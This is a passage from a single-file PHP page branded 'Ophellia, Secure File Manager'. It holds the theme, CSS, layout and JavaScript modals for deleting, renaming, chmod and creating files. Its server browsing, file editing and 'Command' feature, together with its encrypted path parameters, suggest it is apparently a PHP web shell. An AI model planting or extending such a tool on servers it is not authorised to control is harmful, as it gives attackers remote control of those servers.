                        'on-background': '<?= $themeColors['on-background'] ?>',
                        'on-surface': '<?= $themeColors['on-surface'] ?>',
                        'on-surface-variant': '<?= $themeColors['on-surface-variant'] ?>',
                        'outline': '<?= $themeColors['outline'] ?>',
                        'outline-variant': '<?= $themeColors['outline-variant'] ?>',
                        'primary': '<?= $themeColors['primary'] ?>',
                        'primary-hover': '<?= $themeColors['primary-hover'] ?>',
                        'on-primary': '<?= $themeColors['on-primary'] ?>',
                        'error': '<?= $themeColors['error'] ?>',
                        'on-error': '<?= $themeColors['on-error'] ?>',
                        'success': '<?= $themeColors['success'] ?>',
                        'warning': '<?= $themeColors['warning'] ?>',
                    }
                }
            }
        }
    </script>
    <style>
        /* CSS Variables for theming */
        :root {
            --background:
                <?= $themeColors['background'] ?>
            ;
            --surface:
                <?= $themeColors['surface'] ?>
            ;
            --surface-container:
                <?= $themeColors['surface-container'] ?>
            ;
            --surface-container-high:
                <?= $themeColors['surface-container-high'] ?>
            ;
            --on-surface:
                <?= $themeColors['on-surface'] ?>
            ;
            --on-surface-variant:
                <?= $themeColors['on-surface-variant'] ?>
            ;
            --outline:
                <?= $themeColors['outline'] ?>
            ;
            --outline-variant:
                <?= $themeColors['outline-variant'] ?>
            ;
            --primary:
                <?= $themeColors['primary'] ?>
            ;
            --on-primary:
                <?= $themeColors['on-primary'] ?>
            ;
            --error:
                <?= $themeColors['error'] ?>
            ;
            --error-container:
                <?= $themeColors['error-container'] ?>
            ;
            --on-error-container:
                <?= $themeColors['on-error-container'] ?>
            ;
        }

        * {
            box-sizing: border-box;
        }

        html {
            scroll-behavior: smooth;
        }

        /* Alert Styles */
        .alert-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
            max-width: min(400px, 90vw);
            width: auto;
        }

        .alert {
            margin-bottom: 10px;
            padding: 15px 20px;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
            display: flex;
            justify-content: space-between;
            align-items: center;
            animation: slideIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            backdrop-filter: blur(10px);
        }

        .alert-success {
            background-color: var(--surface-container-high);
            border-left: 4px solid var(--success);
            color: var(--on-surface);
        }

        .alert-error {
            background-color: var(--surface-container-high);
            border-left: 4px solid var(--error);
            color: var(--on-surface);
        }

        .close-alert {
            cursor: pointer;
            font-weight: bold;
            font-size: 20px;
            margin-left: 15px;
            line-height: 1;
            opacity: 0.6;
            transition: opacity 0.2s;
        }

        .close-alert:hover {
            opacity: 1;
        }

        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.6);
            z-index: 100;
            overflow: auto;
            animation: fadeIn 0.2s ease-out;
            backdrop-filter: blur(4px);
            padding: 20px;
        }

        .modal-content {
            background-color: var(--surface);
            margin: 5vh auto;
            border-radius: 20px;
            max-width: min(480px, 90vw);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            animation: slideDown 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            overflow: hidden;
        }

        .modal-content.modal-lg {
            max-width: min(800px, 95vw);
        }

        .modal-content.modal-xl {
            max-width: min(1200px, 98vw);
            margin: 2vh auto;
        }

        .modal-header {
            padding: 20px 24px;
            border-bottom: 1px solid var(--outline-variant);
            background-color: var(--surface-container);
        }

        .modal-body {
            padding: 24px;
        }

        .modal-footer {
            padding: 16px 24px;
            background-color: var(--surface-container);
            border-top: 1px solid var(--outline-variant);
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
        }

        /* Button Styles - Unified */
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 10px 20px;
            border-radius: 12px;
            font-weight: 500;
            font-size: 14px;
            transition: all 0.2s ease;
            border: none;
            cursor: pointer;
            white-space: nowrap;
        }

        .btn svg {
            flex-shrink: 0;
            width: 18px;
            height: 18px;
        }

        .btn-primary {
            background-color: var(--primary);
            color: var(--on-primary);
        }

        .btn-primary:hover {
            opacity: 0.9;
        }

        .btn-success {
            background-color: var(--primary);
            color: var(--on-primary);
        }

        .btn-success:hover {
            opacity: 0.9;
        }

        .btn-danger {
            background-color: var(--error);
            color: var(--on-error);
        }

        .btn-danger:hover {
            opacity: 0.9;
        }

        .btn-warning {
            background-color: var(--primary);
            color: var(--on-primary);
        }

        .btn-warning:hover {
            opacity: 0.9;
        }

        .btn-secondary {
            background-color: var(--surface-container-high);
            color: var(--on-surface);
        }

        .btn-secondary:hover {
            background-color: var(--surface-container-highest);
        }

        .btn-ghost {
            background-color: transparent;
            color: var(--on-surface-variant);
        }

        .btn-ghost:hover {
            background-color: var(--surface-container);
        }

        /* Form Styles */
        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: var(--on-surface);
            margin-bottom: 6px;
        }

        .form-input,
        .form-textarea {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid var(--outline-variant);
            border-radius: 12px;
            font-size: 14px;
            transition: all 0.2s ease;
            background-color: var(--surface);
            color: var(--on-surface);
        }

        .form-input:focus,
        .form-textarea:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(255, 181, 156, 0.2);
        }

        .form-textarea {
            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
            resize: vertical;
            min-height: 200px;
        }

        .form-hint {
            font-size: 12px;
            color: var(--on-surface-variant);
            margin-top: 4px;
        }

        /* Info Box */
        .info-box {
            padding: 12px 16px;
            background-color: var(--surface-container);
            border-radius: 12px;
            border: 1px solid var(--outline-variant);
            margin-bottom: 20px;
        }

        .info-box-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 12px;
        }

        .info-box-label {
            font-size: 13px;
            color: var(--on-surface-variant);
            flex-shrink: 0;
        }

        .info-box-value {
            font-size: 13px;
            color: var(--on-surface);
            font-weight: 500;
            word-break: break-all;
            text-align: right;
        }

        .info-box-value.mono {
            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
        }

        /* Table Styles */
        .file-list-container {
            width: 100%;
        }

        #desktopFileTable {
            border-radius: 12px;
            overflow: hidden;
        }

        #desktopFileTable th {
            font-weight: 600;
            letter-spacing: 0.025em;
            font-size: 0.75rem;
        }

        #desktopFileTable td {
            transition: background-color 0.15s ease;
        }

        /* Mobile Card Styles */
        .file-card {
            transition: all 0.2s ease;
        }

        .file-card:active {
            transform: scale(0.98);
        }

        /* Search Input */
        #fileSearch {
            transition: all 0.2s ease;
        }

        #fileSearch:focus {
            box-shadow: 0 0 0 3px rgba(255, 181, 156, 0.2);
        }

        /* Path Navigator */
        .path-navigator {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 4px;
        }

        .path-navigator a {
            padding: 4px 8px;
            border-radius: 6px;
            transition: all 0.15s ease;
        }

        .path-navigator a:hover {
            background-color: var(--surface-container-high);
        }

        /* Animations */
        @keyframes slideIn {
            from {
                transform: translateX(120%);
                opacity: 0;
            }

            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        @keyframes fadeOut {
            from {
                opacity: 1;
                transform: scale(1);
            }

            to {
                opacity: 0;
                transform: scale(0.95);
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }

        @keyframes slideDown {
            from {
                transform: translateY(-30px);
                opacity: 0;
            }

            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        /* Scrollbar Styles */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--surface-container);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb {
            background: var(--outline-variant);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--outline);
        }

        /* Mobile Optimizations */
        @media (max-width: 768px) {
            .alert-container {
                top: 10px;
                right: 10px;
                left: 10px;
                max-width: none;
            }

            .alert {
                width: 100%;
            }

            .modal-content {
                margin: 5vh auto;
                padding: 20px;
            }
        }

        /* Button Hover Effects */
        .action-btn {
            position: relative;
            overflow: hidden;
        }

        .action-btn::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            transform: translate(-50%, -50%);
            transition: width 0.3s, height 0.3s;
        }

        .action-btn:active::after {
            width: 100%;
            height: 100%;
        }

        /* Empty State Animation */
        #emptyState {
            animation: fadeIn 0.5s ease-out;
        }

        /* Focus Styles for Accessibility */
        a:focus-visible,
        button:focus-visible,
        input:focus-visible {
            outline: 2px solid var(--primary);
            outline-offset: 2px;
        }

        /* Selection Color */
        ::selection {
            background-color: var(--primary);
            color: var(--on-primary);
        }
    </style>
</head>

<body class="bg-background min-h-screen flex flex-col">
    <!-- Alert Container -->
    <div id="alertContainer" class="alert-container"></div>

    <!-- Unified Modal System -->
    <!-- Generic Modal Template -->
    <div id="actionModal" class="modal">
        <div class="modal-content" id="modalContent">
            <!-- Content will be dynamically inserted here -->
        </div>
    </div>

    <!-- Header -->
    <header class="bg-surface-container-high text-on-surface shadow-lg sticky top-0 z-50">
        <div class="container mx-auto px-4 py-4">
            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3">
                <div class="flex items-center">
                    <div class="p-2 bg-surface-container-highest rounded-xl mr-3">
                        <svg class="h-6 w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z">
                            </path>
                        </svg>
                    </div>
                    <div>
                        <h1 class="text-xl font-bold tracking-tight">Ophellia <span
                                class="opacity-75 font-normal text-primary">
                                <?= VERSION ?>
                            </span></h1>
                        <p class="text-xs text-on-surface-variant hidden sm:block">Secure File Manager</p>
                    </div>
                </div>
                <div class="flex items-center gap-4 text-sm">
                    <a href="?cd=<?= encryptPath(getcwd()) ?>"
                        class="flex items-center px-3 py-1.5 bg-surface-container-highest rounded-lg hover:bg-primary hover:text-on-primary transition-colors">
                        <svg class="h-4 w-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6">
                            </path>
                        </svg>
                        Home
                    </a>
                    <div class="hidden sm:flex items-center gap-3 text-on-surface-variant">
                        <div class="flex items-center">
                            <svg class="h-4 w-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                    d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
                            </svg>
                            <span>
                                <?= htmlspecialchars($currentUser) ?>
                            </span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <div class="flex-grow">
        <div class="container mx-auto px-3 sm:px-4 py-4 sm:py-6">
            <!-- Directory Navigator -->
            <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant p-4 sm:p-5 mb-4 sm:mb-6">
                <div class="mb-4">
                    <h2
                        class="text-sm font-semibold text-on-surface-variant uppercase tracking-wider mb-2 flex items-center">
                        <svg class="h-4 w-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"></path>
                        </svg>
                        Current Directory
                    </h2>
                    <div class="overflow-x-auto pb-1 -mx-1 px-1">
                        <div
                            class="path-navigator text-sm py-2 px-3 bg-surface-container rounded-xl border border-outline-variant min-w-max">
                            <?= breadcrumbPath($currentDir) ?>
                        </div>
                    </div>
                </div>

                <div class="flex flex-wrap gap-2">
                    <button onclick="showNewFileModal('<?= encryptPath($currentDir) ?>')"
                        class="flex items-center px-3 py-2 bg-primary text-on-primary rounded-xl hover:opacity-90 transition-all shadow-sm hover:shadow-md text-sm font-medium">
                        <svg class="h-4 w-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M12 9v3m0 0v3m0-3h3m-3 0H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                        </svg>
                        <span class="hidden sm:inline">New File</span>
                        <span class="sm:hidden">File</span>
                    </button>
                    <button onclick="showNewFolderModal('<?= encryptPath($currentDir) ?>')"
                        class="flex items-center px-3 py-2 bg-primary text-on-primary rounded-xl hover:opacity-90 transition-all shadow-sm hover:shadow-md text-sm font-medium">
                        <svg class="h-4 w-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M9 13h6m-3-3v6m-9-6h.01M19 13h.01M19 19h.01M5 19h.01M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z">
                            </path>
                        </svg>
                        <span class="hidden sm:inline">New Folder</span>
                        <span class="sm:hidden">Folder</span>
                    </button>
                    <button onclick="showCommandModal('<?= encryptPath($currentDir) ?>')"
                        class="flex items-center px-3 py-2 bg-primary text-on-primary rounded-xl hover:opacity-90 transition-all shadow-sm hover:shadow-md text-sm font-medium">
                        <svg class="h-4 w-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z">
                            </path>
                        </svg>
                        <span class="hidden sm:inline">Command</span>
                        <span class="sm:hidden">Cmd</span>
                    </button>
                    <button onclick="showInfoModal()"
                        class="flex items-center px-3 py-2 bg-primary text-on-primary rounded-xl hover:opacity-90 transition-all shadow-sm hover:shadow-md text-sm font-medium">
                        <svg class="h-4 w-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z">
                            </path>
                        </svg>
                        <span class="hidden sm:inline">Information</span>
                        <span class="sm:hidden">Info</span>
                    </button>
                </div>
            </div>

            <!-- Main Content Area -->
            <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant p-4 sm:p-6">
                <?php
                if (isset($_GET['action'])) {
                    switch ($_GET['action']) {
                        case 'view':
                            if (isset($_GET['file'])) {
                                viewFile(decryptPath($_GET['file']));
                            }
                            break;
                        case 'edit':
                            if (isset($_GET['file'])) {
                                editFile(decryptPath($_GET['file']));
                            }
                            break;
                        default:
                            fileManager($currentDir);
                    }
                } else {
                    fileManager($currentDir);
                }
                ?>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="bg-surface-container-highest text-on-surface-variant py-5 mt-auto">
        <div class="container mx-auto px-4">
            <div class="flex flex-col sm:flex-row justify-between items-center gap-3">
                <div class="flex items-center gap-2">
                    <span class="text-sm">
                        <a href="https://rei.my.id" class="hover:text-primary transition-colors">@elliottophellia</a>
                    </span>
                    <span class="hidden sm:inline text-outline">&bull;</span>
                    <span class="text-xs text-on-surface-variant">v
                        <?= VERSION ?>
                    </span>
                </div>
                <div class="flex items-center gap-4 text-sm">
                    <a href="https://t.me/elliottophellia"
                        class="hover:text-primary transition-colors flex items-center gap-1">
                        <svg class="h-4 w-4" fill="currentColor" viewBox="0 0 24 24">
                            <path
                                d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.161c-.18 1.897-.962 6.502-1.359 8.627-.168.9-.5 1.201-.82 1.23-.697.064-1.226-.461-1.901-.903-1.056-.692-1.653-1.123-2.678-1.799-1.185-.781-.417-1.21.258-1.911.177-.184 3.247-2.977 3.307-3.23.007-.032.015-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.139-5.062 3.345-.479.329-.913.489-1.302.481-.428-.009-1.252-.242-1.865-.442-.751-.244-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.831-2.529 6.998-3.015 3.333-1.386 4.025-1.627 4.477-1.635.099-.002.321.023.465.141.121.1.154.235.17.331.015.093.034.305.019.471z" />
                        </svg>
                        Contact
                    </a>
                    <a href="https://github.com/elliottophellia/ophellia"
                        class="hover:text-primary transition-colors flex items-center gap-1">
                        <svg class="h-4 w-4" fill="currentColor" viewBox="0 0 24 24">
                            <path
                                d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z" />
                        </svg>
                        GitHub
                    </a>
                </div>
            </div>
        </div>
    </footer>

    <script>
        // Alert management
        let alertCounter = 0;

        function showAlert(message, type) {
            const alertContainer = document.getElementById('alertContainer');
            const alertId = `alert-${alertCounter++}`;

            const alertClass = type === 'success' ? 'alert-success' : 'alert-error';
            const iconPath = type === 'success'
                ? '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>'
                : '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>';

            const alertElement = document.createElement('div');
            alertElement.className = `alert ${alertClass}`;
            alertElement.id = alertId;

            alertElement.innerHTML = `
                <div class="flex items-center">
                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        ${iconPath}
                    </svg>
                    <div>${message}</div>
                </div>
                <span class="close-alert" onclick="closeAlert('${alertId}')">&times;</span>
            `;

            alertContainer.appendChild(alertElement);

            // Auto-close after 5 seconds
            setTimeout(() => {
                closeAlert(alertId);
            }, 5000);
        }

        function closeAlert(alertId) {
            const alertElement = document.getElementById(alertId);
            if (alertElement) {
                alertElement.style.animation = 'fadeOut 0.3s ease-out';
                setTimeout(() => {
                    alertElement.remove();
                }, 300);
            }
        }

        // Unified Modal System
        const Modal = {
            element: document.getElementById('actionModal'),
            content: document.getElementById('modalContent'),
            currentAction: null,

            open(html, size = '') {
                this.content.innerHTML = html;
                this.content.className = 'modal-content ' + size;
                this.element.style.display = 'block';
                document.body.style.overflow = 'hidden';

                // Attach close handlers
                const closeBtns = this.content.querySelectorAll('[data-modal-close]');
                closeBtns.forEach(btn => {
                    btn.addEventListener('click', () => this.close());
                });

                // Attach form submit handlers
                const forms = this.content.querySelectorAll('form[data-ajax]');
                forms.forEach(form => {
                    form.addEventListener('submit', (e) => this.handleSubmit(e));
                });
            },

            close() {
                this.element.style.display = 'none';
                this.content.innerHTML = '';
                document.body.style.overflow = '';
                this.currentAction = null;
            },

            setLoading(button, loading = true) {
                if (loading) {
                    button.dataset.originalHtml = button.innerHTML;
                    button.innerHTML = `
                        <svg class="animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" style="width: 18px; height: 18px;">
                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                        </svg>
                        <span>Processing...</span>
                    `;
                    button.disabled = true;
                } else {
                    button.innerHTML = button.dataset.originalHtml || button.innerHTML;
                    button.disabled = false;
                }
            },

            handleSubmit(e) {
                e.preventDefault();
                const form = e.target;
                const button = form.querySelector('button[type="submit"]');
                const formData = new FormData(form);

                this.setLoading(button, true);

                fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                })
                    .then(response => {
                        if (!response.ok) throw new Error('HTTP error! status: ' + response.status);
                        return response.json();
                    })
                    .then(data => {
                        this.close();
                        if (data.success) {
                            if (data.fileTableHtml) {
                                document.getElementById('file-manager-content').innerHTML = data.fileTableHtml;
                                initSearch();
                            }
                            showAlert(data.message, 'success');
                        } else {
                            showAlert(data.message || 'Action failed', 'error');
                        }
                    })
                    .catch(error => {
                        this.setLoading(button, false);
                        showAlert('Error: ' + error.message, 'error');
                    });
            }
        };

        // Close modal on outside click
        window.addEventListener('click', function (event) {
            if (event.target === Modal.element) {
                Modal.close();
            }
        });

        // Close modal on Escape key
        document.addEventListener('keydown', function (event) {
            if (event.key === 'Escape' && Modal.element.style.display === 'block') {
                Modal.close();
            }
        });

        // Delete Modal
        function showDeleteModal(filename, filePath, isDirectory) {
            const html = `
                <div class="modal-header">
                    <h2 class="text-xl font-bold text-error flex items-center gap-3">
                        <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
                        </svg>
                        <span>Delete ${isDirectory ? 'Directory' : 'File'}</span>
                    </h2>
                </div>
                <div class="modal-body">
                    <p class="text-on-surface mb-4">Are you sure you want to delete <strong>"${escapeHtml(filename)}"</strong>? This action cannot be undone.</p>
                    ${isDirectory ? `
                    <div class="p-4 bg-surface-container-high border border-error rounded-xl text-error flex items-start gap-3">
                        <svg class="h-5 w-5 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
                        </svg>
                        <span class="text-sm">Warning: This will recursively delete all contents of the directory!</span>
                    </div>
                    ` : ''}
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-danger" onclick="confirmDelete('${filePath}')">
                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
                        </svg>
                        <span>Delete</span>
                    </button>
                    <button type="button" class="btn btn-secondary" data-modal-close>
                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                        </svg>
                        <span>Cancel</span>
                    </button>
                </div>
            `;
            Modal.open(html);
            Modal.currentAction = { type: 'delete', filePath };
        }

        function confirmDelete(filePath) {
            const button = Modal.content.querySelector('.btn-danger');
            Modal.setLoading(button, true);

            fetch(window.location.href, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'ajax_delete=1&path=' + encodeURIComponent(filePath)
            })
                .then(response => {
                    if (!response.ok) throw new Error('HTTP error! status: ' + response.status);
                    return response.json();
                })
                .then(data => {
                    Modal.close();
                    if (data.success) {
                        document.getElementById('file-manager-content').innerHTML = data.fileTableHtml;
                        initSearch();
                        showAlert(data.message, 'success');
                    } else {
                        showAlert('Failed to delete: ' + data.message, 'error');
                    }
                })
                .catch(error => {
                    Modal.setLoading(button, false);
                    showAlert('Error: ' + error.message, 'error');
                });
        }

        // Rename Modal
        function showRenameModal(filename, filePath, isDirectory) {
            const html = `
                <form data-ajax method="post">
                    <input type="hidden" name="ajax_rename" value="1">
                    <input type="hidden" name="path" value="${filePath}">
                    <div class="modal-header">
                        <h2 class="text-xl font-bold text-primary flex items-center gap-3">
                            <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path>
                            </svg>
                            <span>Rename ${isDirectory ? 'Directory' : 'File'}</span>
                        </h2>
                    </div>
                    <div class="modal-body">
                        <div class="info-box">
                            <div class="info-box-row">
                                <span class="info-box-label">Current name:</span>
                                <span class="info-box-value mono">${escapeHtml(filename)}</span>
                            </div>
                        </div>
                        <div class="form-group">
                            <label class="form-label">New Name</label>
                            <input type="text" name="newname" value="${escapeHtml(filename)}" class="form-input" required autofocus>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="submit" class="btn btn-primary">
                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                            </svg>
                            <span>Rename</span>
                        </button>
                        <button type="button" class="btn btn-secondary" data-modal-close>
                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                            </svg>
                            <span>Cancel</span>
                        </button>
                    </div>
                </form>
            `;
            Modal.open(html);
        }

        // Chmod Modal
        function showChmodModal(filename, filePath, currentPerms, isDirectory) {
            const html = `
                <form data-ajax method="post">
                    <input type="hidden" name="ajax_chmod" value="1">
                    <input type="hidden" name="path" value="${filePath}">
                    <div class="modal-header">
                        <h2 class="text-xl font-bold text-primary flex items-center gap-3">
                            <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                            </svg>
                            <span>Change Permissions</span>
                        </h2>
                    </div>
                    <div class="modal-body">
                        <div class="info-box">
                            <div class="info-box-row">
                                <span class="info-box-label">File:</span>
                                <span class="info-box-value mono" style="max-width: 200px; overflow: hidden; text-overflow: ellipsis;">${escapeHtml(filename)}</span>
                            </div>
                            <div class="info-box-row" style="margin-top: 8px;">
                                <span class="info-box-label">Current:</span>
                                <span class="info-box-value mono text-primary">${currentPerms}</span>
                            </div>
                        </div>
                        <div class="form-group">
                            <label class="form-label">New Permissions (octal)</label>
                            <input type="text" name="permission" value="${currentPerms}" class="form-input mono" required pattern="[0-7]{3,4}" placeholder="e.g. 0755" maxlength="4">
                            <p class="form-hint">Enter 3 or 4 digit octal notation (e.g., 0755 for directories, 0644 for files)</p>
                        </div>
                        <div class="p-4 bg-surface-container-high border border-outline-variant rounded-xl">
                            <p class="font-semibold text-on-surface mb-2" style="font-size: 13px;">Common permissions:</p>
                            <div class="space-y-1" style="font-size: 13px;">
                                <div class="flex items-center justify-between">
                                    <span class="mono text-primary bg-surface px-2 py-0.5 rounded" style="font-size: 12px;">0755</span>
                                    <span class="text-on-surface-variant">Directory (drwxr-xr-x)</span>
                                </div>
                                <div class="flex items-center justify-between">
                                    <span class="mono text-primary bg-surface px-2 py-0.5 rounded" style="font-size: 12px;">0644</span>
                                    <span class="text-on-surface-variant">File (-rw-r--r--)</span>
                                </div>
                                <div class="flex items-center justify-between">
                                    <span class="mono text-primary bg-surface px-2 py-0.5 rounded" style="font-size: 12px;">0777</span>
                                    <span class="text-on-surface-variant">Full access</span>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="submit" class="btn btn-primary">
                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                            </svg>
                            <span>Change</span>
                        </button>
                        <button type="button" class="btn btn-secondary" data-modal-close>
                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                            </svg>
                            <span>Cancel</span>
                        </button>
                    </div>
                </form>
            `;
            Modal.open(html);
        }

        // New File Modal
        function showNewFileModal(dirPath) {
            const html = `
                <form data-ajax method="post" class="modal-form">
                    <input type="hidden" name="ajax_newfile" value="1">
                    <input type="hidden" name="path" value="${dirPath}">
                    <div class="modal-header">
                        <h2 class="text-xl font-bold text-primary flex items-center gap-3">
